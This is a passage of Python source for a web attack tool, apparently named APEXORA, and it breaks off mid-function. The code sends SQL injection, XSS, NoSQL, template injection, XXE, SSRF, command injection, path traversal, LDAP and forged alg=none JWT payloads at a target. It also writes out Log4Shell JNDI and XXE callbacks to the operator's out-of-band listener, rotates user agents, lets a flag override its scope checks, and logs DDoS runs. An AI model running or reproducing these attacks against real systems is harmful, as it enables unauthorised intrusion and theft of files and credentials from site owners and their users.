    print(_c(C_CYN, "║ ") + _dim(_center("AUTHOR: SYLHETYHACKVENGER (THE-ERROR808)", width - 4)) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╚" + "═" * (width - 2) + "╝"))
    print()
    _show_warning()
    print()

def _show_warning():
    width = 78
    wrap_at = width - 4
    words = _WARNING_TEXT.split()
    lines = []
    cur = ""
    for w in words:
        if len(cur) + 1 + len(w) > wrap_at:
            lines.append(cur)
            cur = w
        else:
            cur = (cur + " " + w) if cur else w
    if cur:
        lines.append(cur)
    print(_c(C_RED, "╔" + "═" * (width - 2) + "╗"))
    print(_c(C_RED, "║ ") + _bold(_c(C_BG_RED + C_WHT, _center("⚠  WARNING  ⚠", width - 4))) + _c(C_RED, " ║"))
    print(_c(C_RED, "╠" + "═" * (width - 2) + "╣"))
    for line in lines:
        print(_c(C_RED, "║ ") + _c(C_YEL, line.ljust(width - 4)) + _c(C_RED, " ║"))
    print(_c(C_RED, "╚" + "═" * (width - 2) + "╝"))

def mini_banner():
    width = 78
    print(_c(C_CYN, "╭" + "─" * (width - 2) + "╮"))
    print(_c(C_CYN, "│ ") + _bold(_grn(_center("APEXORA", width - 4))) + _c(C_CYN, " │"))
    print(_c(C_CYN, "╰" + "─" * (width - 2) + "╯"))

def kv_line(key, value, color=C_WHT, kv_width=18):
    print(f"  {_dim(key.ljust(kv_width))} {_c(color, str(value))}")

def section(title, color=C_CYN):
    print()
    print(_c(color, "▸ ") + _bold(_c(color, title)))

def ok(msg):    print(f"  {_grn('✓')} {msg}")
def warn(msg):  print(f"  {_yel('!')} {msg}")
def err(msg):   print(f"  {_red('✗')} {msg}")
def info(msg):  print(f"  {_cyn('•')} {msg}")

def print_table(headers, rows, color=C_CYN):
    widths = [len(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            visible = re.sub(r"\033\[[0-9;]*m", "", str(cell))
            widths[i] = max(widths[i], len(visible))
    sep = "─"
    print(_c(color, "┌" + sep.join("─" * (w + 2) for w in widths) + "┐"))
    print(_c(color, "│") + _c(color, "│").join(_bold(" " + h.ljust(w) + " ") for h, w in zip(headers, widths)) + _c(color, "│"))
    print(_c(color, "├" + sep.join("─" * (w + 2) for w in widths) + "┤"))
    for row in rows:
        print(_c(color, "│") + _c(color, "│").join(" " + str(cell).ljust(w) + " " for cell, w in zip(row, widths)) + _c(color, "│"))
    print(_c(color, "└" + sep.join("─" * (w + 2) for w in widths) + "┘"))

def countdown(seconds, msg="starting"):
    if not TTY:
        return
    for i in range(seconds, 0, -1):
        sys.stdout.write(f"\r  {_yel('▶')} {msg} in {_bold(str(i))}s... ")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r\033[K")
    sys.stdout.flush()

def results_summary(target, category, findings, duration_ms):
    crit = "CRITICAL" if any(f.get("severity") == "CRITICAL" for f in findings) \
           else ("HIGH" if any(f.get("severity") == "HIGH" for f in findings) \
           else ("MEDIUM" if any(f.get("severity") == "MEDIUM" for f in findings) \
           else ("LOW" if any(f.get("severity") == "LOW" for f in findings) \
           else ("INFO" if findings else "NONE"))))
    print()
    print(_c(C_CYN, "╔" + "═" * 76 + "╗"))
    print(_c(C_CYN, "║ ") + _bold(_grn("RESULTS SUMMARY".ljust(74))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╠" + "═" * 76 + "╣"))
    print(_c(C_CYN, "║ ") + "Target:    ".ljust(12) + _bold(target[:60]).ljust(62) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "║ ") + "Category:  ".ljust(12) + category[:60].ljust(62) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "║ ") + "Duration:  ".ljust(12) + (str(round(duration_ms, 1)) + " ms").ljust(62) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "║ ") + "Findings:  ".ljust(12) + str(len(findings)).ljust(62) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "║ ") + "Severity:  ".ljust(12) + severity_badge(crit).ljust(62) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╚" + "═" * 76 + "╝"))

def live_scan_header(target, category):
    print()
    print(_c(C_MAG, "▓" * 78))
    print(_c(C_MAG, "▓ ") + _bold(_wht(f"LIVE SCAN · {category.upper()} · {target}")) + _c(C_MAG, " ▓"))
    print(_c(C_MAG, "▓" * 78))
    flow_diagram([
        "target: " + target,
        "fingerprint WAF / server",
        "dispatch " + category + " module",
        "collect findings",
        "classify severity",
        "persist to DB",
    ], C_MAG)

def _make_token():
    return secrets.token_hex(32)

def _save_auth(token, user_hash):
    payload = {"token": token, "issued": int(time.time()), "user_hash": user_hash}
    AUTH_FILE.write_text(json.dumps(payload))
    try:
        os.chmod(AUTH_FILE, 0o600)
    except Exception:
        pass

def _load_auth():
    if not AUTH_FILE.exists():
        return None
    try:
        data = json.loads(AUTH_FILE.read_text())
        issued = int(data.get("issued", 0))
        if time.time() - issued > AUTH_TTL_HOURS * 3600:
            return None
        if data.get("user_hash") != _AUTH_USER_HASH:
            return None
        return data
    except Exception:
        return None

def _clear_auth():
    try:
        AUTH_FILE.unlink()
    except Exception:
        pass

def security_gate():
    show_banner()
    cached = _load_auth()
    if cached:
        info(f"session token valid ({AUTH_TTL_HOURS}h TTL) — welcome back, operator")
        return True
    print(_c(C_CYN, "╔" + "═" * 76 + "╗"))
    print(_c(C_CYN, "║ ") + _bold(_yel("SECURITY GATE — CREDENTIALS REQUIRED".ljust(74))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╚" + "═" * 76 + "╝"))
    for attempt in range(3):
        try:
            user = input(f"  {_cyn('operator')}: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            err("gate aborted")
            sys.exit(1)
        try:
            pw = getpass.getpass(f"  {_cyn('access key')}: ")
        except (EOFError, KeyboardInterrupt):
            print()
            err("gate aborted")
            sys.exit(1)
        uh = hashlib.sha256(user.encode("utf-8")).hexdigest()
        ph = hashlib.sha256(pw.encode("utf-8")).hexdigest()
        if hmac.compare_digest(uh, _AUTH_USER_HASH) and hmac.compare_digest(ph, _AUTH_PASS_HASH):
            tok = _make_token()
            _save_auth(tok, uh)
            ok("access granted")
            info(f"token saved to {AUTH_FILE} (valid {AUTH_TTL_HOURS}h)")
            return True
        err(f"access denied ({attempt + 1}/3)")
        time.sleep(0.6)
    err("too many failed attempts — exiting")
    sys.exit(1)

def basic_auth_gate():
    show_banner()
    print(_c(C_CYN, "╔" + "═" * 76 + "╗"))
    print(_c(C_CYN, "║ ") + _bold(_yel("BASIC AUTHENTICATION — HTTP BASIC".ljust(74))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╚" + "═" * 76 + "╝"))
    for attempt in range(3):
        try:
            user = input(f"  {_cyn('username')}: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            err("aborted")
            sys.exit(1)
        try:
            pw = getpass.getpass(f"  {_cyn('password')}: ")
        except (EOFError, KeyboardInterrupt):
            print()
            err("aborted")
            sys.exit(1)
        uh = hashlib.sha256(user.encode("utf-8")).hexdigest()
        ph = hashlib.sha256(pw.encode("utf-8")).hexdigest()
        if hmac.compare_digest(uh, _AUTH_USER_HASH) and hmac.compare_digest(ph, _AUTH_PASS_HASH):
            ok("access granted")
            return True
        err(f"access denied ({attempt + 1}/3)")
        time.sleep(0.6)
    err("too many failed attempts — exiting")
    sys.exit(1)

def load_scope():
    if not SCOPE_FILE.exists():
        return []
    try:
        return [l.strip() for l in SCOPE_FILE.read_text().splitlines() if l.strip() and not l.startswith("#")]
    except Exception:
        return []

def save_scope(patterns):
    SCOPE_FILE.write_text("\n".join(patterns))

def add_scope(pattern):
    pats = load_scope()
    if pattern not in pats:
        pats.append(pattern)
        save_scope(pats)
        return True
    return False

def host_in_scope(host, force=False):
    if force:
        return True
    pats = load_scope()
    if not pats:
        return False
    host = host.lower()
    for p in pats:
        p = p.lower()
        if p == host:
            return True
        if p.startswith("*."):
            base = p[2:]
            if host == base or host.endswith("." + base):
                return True
    return False

def db_conn():
    conn = sqlite3.connect(str(DB_FILE), timeout=10)
    conn.row_factory = sqlite3.Row
    conn.executescript(SQL_SCHEMA)
    return conn

def db_insert_scan(res):
    try:
        conn = db_conn()
        conn.execute(
            "INSERT INTO scans (target_url,ip,status,server,http_status,response_ms,body_size,detected_json,headers_json) VALUES (?,?,?,?,?,?,?,?,?)",
            (
                res.get("url"),
                res.get("ip") or "",
                len(res.get("detected", [])),
                res.get("server") or "",
                res.get("status") or 0,
                res.get("timing") or 0.0,
                res.get("body_size") or 0,
                json.dumps(res.get("detected", [])),
                json.dumps(res.get("headers", {})),
            ),
        )
        conn.commit()
        rid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
        conn.close()
        return rid
    except Exception:
        return 0

def db_insert_test(target, category, payload_count, findings, criticality, duration_ms):
    try:
        conn = db_conn()
        conn.execute(
            "INSERT INTO vuln_tests (target_url,category,payload_count,findings_count,criticality,findings_json,duration_ms) VALUES (?,?,?,?,?,?,?)",
            (target, category, payload_count, len(findings), criticality, json.dumps(findings), duration_ms),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass

def db_insert_ddos(target, modules, duration_s, intensity, availability_pct, classification, telemetry):
    try:
        conn = db_conn()
        conn.execute(
            "INSERT INTO ddos_runs (target_url,modules,duration_s,intensity,availability_pct,classification,telemetry_json) VALUES (?,?,?,?,?,?,?)",
            (target, modules, duration_s, intensity, availability_pct, classification, json.dumps(telemetry)),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass

def db_insert_oob(target, category, token, source_ip, headers):
    try:
        conn = db_conn()
        conn.execute(
            "INSERT INTO oob_interactions (target_url,category,token,source_ip,headers_json) VALUES (?,?,?,?,?)",
            (target, category, token, source_ip, json.dumps(headers)),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass

def db_insert_bulk(category, targets, results, duration_ms):
    try:
        conn = db_conn()
        conn.execute(
            "INSERT INTO bulk_runs (category,targets_json,results_json,duration_ms) VALUES (?,?,?,?)",
            (category, json.dumps(targets), json.dumps(results), duration_ms),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass

def db_history(limit=20):
    try:
        conn = db_conn()
        rows = conn.execute(
            "SELECT id, target_url, status, http_status, created_at FROM scans ORDER BY id DESC LIMIT ?", (limit,)
        ).fetchall()
        conn.close()
        return [dict(r) for r in rows]
    except Exception:
        return []

def db_tests_history(limit=20):
    try:
        conn = db_conn()
        rows = conn.execute(
            "SELECT id, target_url, category, findings_count, criticality, created_at FROM vuln_tests ORDER BY id DESC LIMIT ?", (limit,)
        ).fetchall()
        conn.close()
        return [dict(r) for r in rows]
    except Exception:
        return []

def db_stats():
    try:
        conn = db_conn()
        s = conn.execute("SELECT COUNT(*) FROM scans").fetchone()[0]
        t = conn.execute("SELECT COUNT(*) FROM vuln_tests").fetchone()[0]
        w = conn.execute("SELECT COUNT(*) FROM scans WHERE status>0").fetchone()[0]
        d = conn.execute("SELECT COUNT(*) FROM ddos_runs").fetchone()[0]
        o = conn.execute("SELECT COUNT(*) FROM oob_interactions").fetchone()[0]
        b = conn.execute("SELECT COUNT(*) FROM bulk_runs").fetchone()[0]
        crit = conn.execute("SELECT criticality, COUNT(*) FROM vuln_tests GROUP BY criticality").fetchall()
        conn.close()
        return {"scans": s, "tests": t, "waf_hits": w, "ddos": d, "oob": o, "bulk": b,
                "criticality": [dict(zip(["criticality","count"], r)) for r in crit]}
    except Exception:
        return {"scans": 0, "tests": 0, "waf_hits": 0, "ddos": 0, "oob": 0, "bulk": 0, "criticality": []}

class RateLimiter:
    def __init__(self):
        self._lock = threading.Lock()
        self._last = 0.0
        self._delay = 0.0
        self._jitter = 0.0
        self._load()
    def _load(self):
        if RATE_FILE.exists():
            try:
                d = json.loads(RATE_FILE.read_text())
                self._delay = float(d.get("delay", 0.0))
                self._jitter = float(d.get("jitter", 0.0))
            except Exception:
                pass
    def _save(self):
        try:
            RATE_FILE.write_text(json.dumps({"delay": self._delay, "jitter": self._jitter}))
        except Exception:
            pass
    def set(self, delay, jitter=0.0):
        self._delay = max(0.0, min(delay, 10.0))
        self._jitter = max(0.0, min(jitter, 5.0))
        self._save()
    def wait(self):
        if self._delay <= 0:
            return
        with self._lock:
            now = time.time()
            elapsed = now - self._last
            target = self._delay + random.uniform(0, self._jitter)
            if elapsed < target:
                time.sleep(target - elapsed)
            self._last = time.time()

_RATE_LIMITER = RateLimiter()

class OOBServer:
    def __init__(self, host="0.0.0.0", port=8888):
        self.host = host
        self.port = port
        self._sock = None
        self._thread = None
        self._running = False
        self._hits = []
        self._lock = threading.Lock()
    def start(self):
        if self._running:
            return
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._sock.bind((self.host, self.port))
            self._sock.listen(50)
            self._sock.settimeout(1.0)
        except Exception as e:
            err(f"OOB bind failed: {e}")
            return
        self._running = True
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()
        ok(f"OOB server listening on {self.host}:{self.port}")
        self._save_config()
    def _save_config(self):
        try:
            OOB_FILE.write_text(json.dumps({"host": self.host, "port": self.port,
                                            "url": f"http://{self.host}:{self.port}"}))
        except Exception:
            pass
    def _serve(self):
        while self._running:
            try:
                conn, addr = self._sock.accept()
                threading.Thread(target=self._handle, args=(conn, addr), daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break
    def _handle(self, conn, addr):
        try:
            conn.settimeout(3)
            data = conn.recv(8192)
            if not data:
                conn.close()
                return
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                text = repr(data[:500])
            first_line = text.split("\r\n")[0] if text else "?"
            headers = {}
            for line in text.split("\r\n")[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    headers[k.strip()] = v.strip()
            token = ""
            m = re.search(r"(?:GET|POST|PUT|HEAD)\s+/([^\s/]+)", first_line)
            if m:
                token = m.group(1)
            hit = {
                "time": datetime.utcnow().isoformat(),
                "source_ip": addr[0],
                "source_port": addr[1],
                "method_path": first_line,
                "token": token,
                "headers": headers,
                "body": text[:2000],
            }
            with self._lock:
                self._hits.append(hit)
            db_insert_oob("", "oob", token, addr[0], headers)
            try:
                body = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK"
                conn.sendall(body)
            except Exception:
                pass
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass
    def stop(self):
        self._running = False
        try:
            if self._sock:
                self._sock.close()
        except Exception:
            pass
    def get_hits(self):
        with self._lock:
            return list(self._hits)
    def clear(self):
        with self._lock:
            self._hits.clear()

_OOB_SERVER = OOBServer()

def _oob_url(token=""):
    if OOB_FILE.exists():
        try:
            d = json.loads(OOB_FILE.read_text())
            base = d.get("url", f"http://127.0.0.1:8888")
        except Exception:
            base = f"http://127.0.0.1:8888"
    else:
        base = f"http://127.0.0.1:8888"
    if token:
        return f"{base}/{token}"
    return base

def run_oob_blind(t, verbose=False):
    f = []
    token = secrets.token_hex(8)
    oob = _oob_url(token)
    payloads = [
        f"http://{oob}/ssrf",
        f"http://{oob}/xxe",
        f"${{jndi:ldap://{oob}/log4j}}",
        f"${{jndi:dns://{oob}/dns}}",
        f"<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"{oob}/xxe\">]><x>&e;</x>",
    ]
    for i, p in enumerate(payloads, 1):
        if verbose:
            progress_bar("oob", i, len(payloads), color=C_RED)
        sep = "&" if "?" in t else "?"
        if p.startswith("<?xml"):
            fetch(t, method="POST", body=p, extra_headers={"Content-Type": "application/xml"})
        elif p.startswith("${jndi"):
            fetch(t, extra_headers={"User-Agent": p, "X-Api-Version": p})
        else:
            fetch(t + sep + "url=" + quote(p, safe=""))
        time.sleep(0.3)
    time.sleep(1.0)
    hits = [h for h in _OOB_SERVER.get_hits() if token in h.get("token", "") or token in h.get("body", "")]
    for h in hits:
        f.append(enrich({
            "type": "oob_blind",
            "severity": "CRITICAL",
            "payload": h.get("method_path", "")[:200],
            "description": f"Out-of-band callback received from {h.get('source_ip')}",
            "evidence": f"time={h.get('time')} · ip={h.get('source_ip')} · headers={json.dumps(h.get('headers',{}))[:150]}"
        }))
    if not f:
        f.append(enrich({
            "type": "oob_no_blind",
            "severity": "INFO",
            "payload": f"{len(payloads)} OOB payloads",
            "description": "No out-of-band callbacks received",
            "evidence": f"token={token} · hits={len(hits)}"
        }))
    return f

class TerminalRecorder:
    def __init__(self):
        self._records = []
        self._lock = threading.Lock()
        self._orig_stdout = sys.stdout
        self._active = False
    def start(self):
        if self._active:
            return
        self._active = True
        self._orig_stdout = sys.stdout
        rec = self
        class Tee:
            def write(self, data):
                rec._orig_stdout.write(data)
                with rec._lock:
                    rec._records.append({"t": time.time(), "data": data})
                return len(data)
            def flush(self):
                rec._orig_stdout.flush()
            def isatty(self):
                return rec._orig_stdout.isatty()
            def fileno(self):
                return rec._orig_stdout.fileno()
        sys.stdout = Tee()
        atexit_register(self.dump_all)
    def dump_all(self):
        if not self._records:
            return
        with self._lock:
            records = list(self._records)
            self._records = []
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base = REPORT_DIR / f"session_{stamp}"
        try:
            txt = "".join(r["data"] for r in records)
            (base.with_suffix(".txt")).write_text(txt, encoding="utf-8")
        except Exception:
            pass
        try:
            json_recs = [{"t": r["t"], "data": r["data"]} for r in records]
            (base.with_suffix(".json")).write_text(json.dumps(json_recs, indent=2), encoding="utf-8")
        except Exception:
            pass
        try:
            txt = "".join(r["data"] for r in records)
            clean = re.sub(r"\033\[[0-9;]*m", "", txt)
            xml = '<?xml version="1.0" encoding="UTF-8"?>\n<session>\n'
            for line in clean.split("\n"):
                if line.strip():
                    xml += "  <line>" + line.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;") + "</line>\n"
            xml += "</session>\n"
            (base.with_suffix(".xml")).write_text(xml, encoding="utf-8")
        except Exception:
            pass
        try:
            allfile = REPORT_DIR / "ALL_SESSIONS.txt"
            with open(allfile, "a", encoding="utf-8") as fh:
                fh.write(f"\n\n===== SESSION {stamp} =====\n")
                fh.write(re.sub(r"\033\[[0-9;]*m", "", "".join(r["data"] for r in records)))
            alljson = REPORT_DIR / "ALL_SESSIONS.json"
            with open(alljson, "a", encoding="utf-8") as fh:
                fh.write(json.dumps({"session": stamp, "records": [{"t": r["t"], "data": r["data"]} for r in records]}, indent=2) + "\n")
        except Exception:
            pass
        try:
            info(f"session saved: {base}.txt / .json / .xml + ALL_SESSIONS.*")
        except Exception:
            pass

def atexit_register(fn):
    import atexit
    atexit.register(fn)

_RECORDER = TerminalRecorder()

ERROR_SIGS = ["sql syntax","mysql_fetch","you have an error in your sql syntax","unclosed quotation mark","ora-01756","ora-00933","postgresql","pg_query","sqlite3","sqlstate","syntax error","unknown column","fatal error","stack trace","pdoexception","warning: mysql","microsoft ole db"]

def fetch(url, extra_headers=None, method="GET", body=None, timeout=15):
    _RATE_LIMITER.wait()
    p = urlparse(url)
    scheme = p.scheme or "https"
    host = p.hostname
    if not host:
        return {"status": None, "headers": {}, "server": "", "body": "", "body_size": 0, "time_ms": None, "error": "no host"}
    port = p.port or (443 if scheme == "https" else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    try:
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        h = {
            "User-Agent": _next_user_agent(),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "identity",
            "Connection": "close",
        }
        if extra_headers:
            h.update(extra_headers)
        t0 = time.time()
        conn.request(method, path, body=body, headers=h)
        resp = conn.getresponse()
        data = resp.read()
        hdrs = dict(resp.getheaders())
        return {
            "status": resp.status,
            "headers": hdrs,
            "server": hdrs.get("Server", ""),
            "body": data.decode("utf-8", "ignore")[:10000],
            "body_size": len(data),
            "time_ms": round((time.time() - t0) * 1000, 1),
            "error": None,
        }
    except Exception as e:
        return {"status": None, "headers": {}, "server": "", "body": "", "body_size": 0, "time_ms": None, "error": str(e)}

def detect_err(r):
    if r.get("error"):
        return None
    low = r.get("body", "").lower()
    for s in ERROR_SIGS:
        if s in low:
            return s
    return None

def is_blocked(r):
    return r.get("status") in (403, 406, 429, 503)

def get_pl(cat):
    v = PAYLOADS.get(cat, [])
    return v if isinstance(v, list) else []

def enrich(f):
    f.setdefault("remediation", REMEDIATION.get(f.get("type", ""), ""))
    f.setdefault("mitre", MITRE.get(f.get("type", ""), ""))
    return f

class Detector:
    def detect(self, url):
        url = self._norm(url)
        res = {
            "url": url, "detected": [], "headers": {}, "cookies": [],
            "status": 0, "error": None, "body_size": 0, "server": "", "ip": "", "timing": 0.0
        }
        p = urlparse(url)
        host = p.hostname or ""
        if host:
            try:
                ip = socket.gethostbyname(host)
                if ip != host:
                    res["ip"] = ip
            except Exception:
                pass
        with Spinner(f"probing {url}"):
            r = fetch(url, timeout=15)
        res["status"] = r.get("status") or 0
        res["error"] = r.get("error")
        res["body_size"] = r.get("body_size") or 0
        res["server"] = r.get("server") or ""
        res["headers"] = r.get("headers", {})
        res["timing"] = r.get("time_ms") or 0.0
        hd = {k.lower(): v for k, v in res["headers"].items()}
        ck = r.get("headers", {}).get("Set-Cookie", "")
        res["cookies"] = [c.split("=")[0].strip() for c in ck.split(";") if "=" in c] if ck else []
        body_low = r.get("body", "").lower()
        cs = ";".join(res["cookies"]).lower()
        for name, sig in WAF_SIGNATURES.items():
            hdrs, cks, bds, vendor, cat, conf = sig
            matched = False
            ev = []
            for h in hdrs:
                if ":" in h:
                    k, v = h.split(":", 1)
                    if k.lower() in hd and v.lower() in hd[k.lower()].lower():
                        matched = True
                        ev.append(f"header:{k}={v}")
                        break
                elif h.lower() in hd:
                    matched = True
                    ev.append(f"header:{h}")
                    break
            if not matched:
                for c in cks:
                    if c.lower() in cs:
                        matched = True
                        ev.append(f"cookie:{c}")
                        break
            if not matched:
                for b in bds:
                    if b.lower() in body_low:
                        matched = True
                        ev.append(f"body:{b}")
                        break
            if matched:
                res["detected"].append({
                    "name": name, "vendor": vendor, "category": cat,
                    "confidence": conf, "evidence": ev
                })
        return res

    def _norm(self, s):
        s = s.strip()
        if not re.match(r"^https?://", s, re.I):
            s = "https://" + s
        return s.rstrip("/")

def run_sqli(t, verbose=False):
    f = []
    pl = get_pl("sqli")
    blocks = 0
    total = min(len(pl), 60)
    for i, p in enumerate(pl[:60], 1):
        if verbose:
            progress_bar("sqli", i, total, color=C_RED)
        sep = "&" if "?" in t else "?"
        to = 8 if any(x in p.lower() for x in ["sleep", "waitfor", "pg_sleep", "benchmark"]) else 15
        r = fetch(t + sep + "id=" + quote(p, safe=""), timeout=to)
        e = detect_err(r)
        if e:
            f.append(enrich({
                "type": "error_based_sqli", "severity": "HIGH", "payload": p,
                "description": f"DBMS error signature matched: '{e}'",
                "evidence": f"HTTP {r.get('status')} · error='{e}' · payload_len={len(p)}"
            }))
            break
        if any(x in p.lower() for x in ["sleep", "waitfor", "pg_sleep"]) and r.get("time_ms") and r["time_ms"] > 4500:
            f.append(enrich({
                "type": "time_based_sqli", "severity": "CRITICAL", "payload": p,
                "description": f"Time-based delay {r['time_ms']}ms",
                "evidence": f"response_time={r['time_ms']}ms (threshold 4500ms) · payload_len={len(p)}"
            }))
            break
        if is_blocked(r):
            blocks += 1
        if blocks >= 8:
            f.append(enrich({
                "type": "waf_block_abort", "severity": "INFO", "payload": f"{blocks} blocks",
                "description": "Aborted after 8 WAF blocks (target actively filtering)",
                "evidence": "stop-on-block safety triggered"
            }))
            break
    return f

def run_sqli_blind(t, verbose=False):
    f = []
    pl = get_pl("sqli-blind") or get_pl("sqli")
    total = min(len(pl), 30)
    for i, p in enumerate(pl[:30], 1):
        if verbose:
            progress_bar("sqli-blind", i, total, color=C_RED)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "id=" + quote(p, safe=""), timeout=8)
        if r.get("time_ms") and r["time_ms"] > 4500:
            f.append(enrich({
                "type": "blind_sqli", "severity": "CRITICAL", "payload": p,
                "description": f"Blind time-based delay {r['time_ms']}ms",
                "evidence": f"response_time={r['time_ms']}ms with boolean-blind payload"
            }))
    return f

def run_xss(t, verbose=False):
    f = []
    pl = get_pl("xss")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("xss", i, total, color=C_YEL)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "q=" + quote(p, safe=""))
        body = r.get("body", "")
        if body and (p in body or "<script>alert" in body or "onerror=alert" in body):
            f.append(enrich({
                "type": "reflected_xss", "severity": "HIGH", "payload": p,
                "description": "Payload reflected unencoded in response body",
                "evidence": f"HTTP {r.get('status')} · snippet={body[:120]}"
            }))
    return f

def run_nosql(t, verbose=False):
    f = []
    b = fetch(t)
    pl = get_pl("nosql")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("nosql", i, total, color=C_MAG)
        r = fetch(t, extra_headers={"Content-Type": "application/json"}, method="POST", body=p)
        if r.get("status") in (200, 201) and b.get("status") in (401, 403):
            f.append(enrich({
                "type": "nosql_bypass", "severity": "CRITICAL", "payload": p,
                "description": "NoSQL operator injection caused auth bypass",
                "evidence": f"baseline={b.get('status')} → injected={r.get('status')}"
            }))
    return f

def run_ssti(t, fw="generic", verbose=False):
    f = []
    root = PAYLOADS.get("ssti", {})
    pl = root.get(fw, root.get("generic", [])) if isinstance(root, dict) else []
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar(f"ssti[{fw}]", i, total, color=C_RED)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "name=" + quote(p, safe=""))
        body = r.get("body", "")
        if body and ("uid=" in body or ("49" in body and "{{7*7}}" not in body)):
            f.append(enrich({
                "type": "ssti", "severity": "CRITICAL", "payload": p,
                "description": f"Template injection ({fw}) evaluated payload",
                "evidence": f"HTTP {r.get('status')} · body_snippet={body[:160]}"
            }))
    return f

def run_xxe(t, verbose=False):
    f = []
    pl = get_pl("xxe")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("xxe", i, total, color=C_RED)
        r = fetch(t, extra_headers={"Content-Type": "application/xml"}, method="POST", body=p)
        body = r.get("body", "")
        if "root:" in body or "AccessKeyId" in body:
            f.append(enrich({
                "type": "xxe", "severity": "CRITICAL", "payload": p[:100],
                "description": "External entity expansion returned file/credential data",
                "evidence": f"HTTP {r.get('status')} · body={body[:180]}"
            }))
    return f

def run_ssrf(t, verbose=False):
    f = []
    pl = get_pl("ssrf")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("ssrf", i, total, color=C_RED)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "url=" + quote(p, safe=""))
        body = r.get("body", "")
        if "AccessKeyId" in body or "root:" in body:
            f.append(enrich({
                "type": "ssrf", "severity": "CRITICAL", "payload": p,
                "description": "Server-side fetch returned internal data",
                "evidence": f"HTTP {r.get('status')} · body={body[:180]}"
            }))
    return f

def run_cmdi(t, verbose=False):
    f = []
    pl = get_pl("cmdi")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("cmdi", i, total, color=C_RED)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "cmd=" + quote(p, safe=""))
        body = r.get("body", "")
        if "uid=" in body or "gid=" in body:
            f.append(enrich({
                "type": "cmdi", "severity": "CRITICAL", "payload": p,
                "description": "Command injection executed (uid/gid in response)",
                "evidence": f"HTTP {r.get('status')} · body={body[:180]}"
            }))
    return f

def run_lfi(t, verbose=False):
    f = []
    pl = get_pl("lfi")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("lfi", i, total, color=C_RED)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "file=" + quote(p, safe=""))
        body = r.get("body", "")
        if "root:" in body and "/bin/" in body:
            f.append(enrich({
                "type": "lfi", "severity": "CRITICAL", "payload": p,
                "description": "Path traversal exposed /etc/passwd",
                "evidence": f"HTTP {r.get('status')} · body={body[:180]}"
            }))
    return f

def run_ldap_attack(t, verbose=False):
    f = []
    pl = get_pl("ldap")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("ldap", i, total, color=C_YEL)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "user=" + quote(p, safe=""))
        if "ldap" in r.get("body", "").lower() and "error" in r.get("body", "").lower():
            f.append(enrich({
                "type": "ldap_injection", "severity": "MEDIUM", "payload": p,
                "description": "LDAP filter error triggered",
                "evidence": f"HTTP {r.get('status')} · body={r.get('body','')[:180]}"
            }))
    return f

def run_jwt_attack(t, verbose=False):
    f = []
    pl = get_pl("jwt")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("jwt", i, total, color=C_YEL)
        if p.startswith('{"alg"'):
            try:
                h = base64.urlsafe_b64encode(p.encode()).rstrip(b"=").decode()
                tok = f"{h}.eyJzdWIiOiJhZG1pbiJ9."
                r = fetch(t, extra_headers={"Authorization": f"Bearer {tok}"})
                if r.get("status") in (200, 201) and not is_blocked(r):
                    f.append(enrich({
                        "type": "jwt_alg_none", "severity": "CRITICAL", "payload": p,
                        "description": "Server accepted alg=none JWT",
                        "evidence": f"HTTP {r.get('status')} · token_header={h[:40]}"
                    }))
            except Exception:
                pass
    return f

def run_oauth_attack(t, verbose=False):
    f = []
    pl = get_pl("oauth")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
